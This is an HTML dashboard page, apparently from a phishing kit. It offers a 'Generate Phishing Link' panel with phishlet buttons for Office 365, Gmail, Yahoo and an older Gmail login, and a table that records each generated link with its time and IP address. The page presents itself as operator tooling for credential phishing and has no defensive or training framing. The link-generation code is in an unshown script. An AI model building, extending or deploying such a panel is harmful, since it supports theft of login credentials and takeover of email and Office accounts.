<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generate Link - Dashboard</title>
    <link rel="stylesheet" href="styles.css">

    <!-- Load Firebase and script files -->
    <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script defer src="firebase-config.js"></script>
    <script defer src="script.js"></script>
</head>
<body>

    <div class="sidebar">
        <h2>Dashboard</h2>
        <button class="menu-btn" onclick="window.location.href='dashboard1.html'">🏠 Home</button>
        <button class="menu-btn" onclick="window.location.href='dashboard3.html'">📜 Drakotech</button>
        <button class="menu-btn" onclick="logout()">🚪 Logout</button>
    </div>

    <div class="main-content">
        <h1>Generate Phishing Link</h1>
        <p>Select a platform to generate a phishing link.</p>
        
        <div class="phishlet-buttons">
            <button class="phishlet-btn" onclick="generatePhishletLink('office365')">💼 Office 365</button>
            <button class="phishlet-btn" onclick="generatePhishletLink('gmail')">📧 Gmail</button>
            <button class="phishlet-btn" onclick="generatePhishletLink('yahoo')">📨 Yahoo</button>
            <button class="phishlet-btn" onclick="generatePhishletLink('gmail-old')">📩 Gmail (Old)</button>
        </div>

        <!-- Placeholder for the generated link -->
        <div id="phishletLink" class="generated-link-display">
            <p>Generated Link: <a href="#" target="_blank" id="link"></a></p>
        </div>

        <!-- Table to display generated links -->
        <table id="generatedLinks">
            <thead>
                <tr>
                    <th>Phishlet</th>
                    <th>Generated Link</th>
                    <th>Time</th>
                    <th>IP Address</th>
                </tr>
            </thead>
            <tbody>
                <!-- Generated links will be added here -->
            </tbody>
        </table>
    </div>

</body>
</html>
